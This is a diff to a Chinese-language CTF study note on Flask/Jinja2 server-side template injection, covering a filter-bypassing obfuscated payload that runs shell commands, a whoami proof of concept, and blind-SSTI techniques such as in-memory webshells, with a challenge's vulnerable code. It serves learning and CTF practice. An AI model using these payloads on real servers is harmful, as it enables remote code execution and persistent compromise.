@@ -96,3 +96,61 @@ tags:
     `{%if((''|attr((lipsum|string|list).pop(18)*2~'cl'~'ass'~(lipsum|string|list).pop(18)*2)|attr((lipsum|string|list).pop(18)*2~'ba'~'ses'~(lipsum|string|list).pop(18)*2)|attr((lipsum|string|list).pop(18)*2~'getitem'~(lipsum|string|list).pop(18)*2)(0)|attr((lipsum|string|list).pop(18)*2~'subc'~'lasses'~(lipsum|string|list).pop(18)*2)()|attr((lipsum|string|list).pop(18)*2~'geti'~'tem'~(lipsum|string|list).pop(18)*2)(101)|attr((lipsum|string|list).pop(18)*2~'ini'~'t'~(lipsum|string|list).pop(18)*2)|attr((lipsum|string|list).pop(18)*2~'glob'~'als'~(lipsum|string|list).pop(18)*2)|attr((lipsum|string|list).pop(18)*2~'get'~'item'~(lipsum|string|list).pop(18)*2)((lipsum|string|list).pop(18)*2~'buil'~'tins'~(lipsum|string|list).pop(18)*2)|attr((lipsum|string|list).pop(18)*2~'get'~'item'~(lipsum|string|list).pop(18)*2)('ev'~'al')((lipsum|string|list).pop(18)*2~'imp'~'ort'~(lipsum|string|list).pop(18)*2)('o'~'s')|attr('pop'~'en')('head$IFS$9-c$IFS$91$IFS$9/flag').('read')())=='Y')%}EndlessShw{%endif%}`
     参考以下 PoC：
     `''.__class__.__bases__[0].__subclasses__()[101].__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__')('os').popen("whoami").read()`
+
+### 1.4 Flask 下 SSTI 的不出网回显方式
+
+1. 对于没有过滤 `{{}}` 但是没有回显的 SSTI，就可以考虑以下两种方法：
+
+    1. debug 模式的报错
+    2. 非 debug 模式下利用内存马
+
+2. 参考文章如下：
+
+    > https://www.cnblogs.com/gxngxngxn/p/18181936
+
+    文章写的很好，牛逼的。
+    底层原理并不是额外的添加路由，而是去修改路由前的钩子，个人感觉有点类似打 SpringMVC 的 Interceptor 内存马，或者类似 Servlet 的 Filter。
+
+3. 例题：[2024蜀道山]my_site，无回显的代码如下：
+    ```python
+    # ...
+    @app.route('/rot13', methods=['GET', 'POST'])
+    def rot13_route():
+        if request.method == 'POST':
+            action = request.form['action']
+            text = request.form['text']
+            
+            if action == 'encrypt':
+                encrypted_text = rot13(text)
+                return redirect(url_for('rot13_result', result=encrypted_text, action='encrypt'))
+        
+            
+            elif action == 'decrypt':
+                text = request.form['text']
+                decrypted_text = rot13(text)
+                # 有 () 时进入
+                if key(decrypted_text):
+                    # 漏洞口
+                    template = '<h1>Your decrypted text is: {{%s}}</h1>' % decrypted_text
+                    try:
+                        # 这里没有 return，因此没有回显
+                        render_template_string(template)
+                    except Exception as e:
+                        abort(404)
+                    # return "既然你是黑阔，那我凭什么给你回显"
+                    return redirect(url_for('rot13_result', result="既然你是黑阔，那我凭什么给你回显", action='decrypt'))
+    
+                else:
+                    return redirect(url_for('rot13_result', result=decrypted_text, action='decrypt'))
+                    template = '<h1>Your decrypted text is: %s</h1>' % decrypted_text
+                    return render_template_string(template)
+        
+        return render_template('index.html')
+    
+    @app.route('/rot13_result/<action>/<result>')
+    def rot13_result(action, result):
+        return render_template('rot13_result.html', action=action, result=result)
+    # ...
+    ```
+
+    
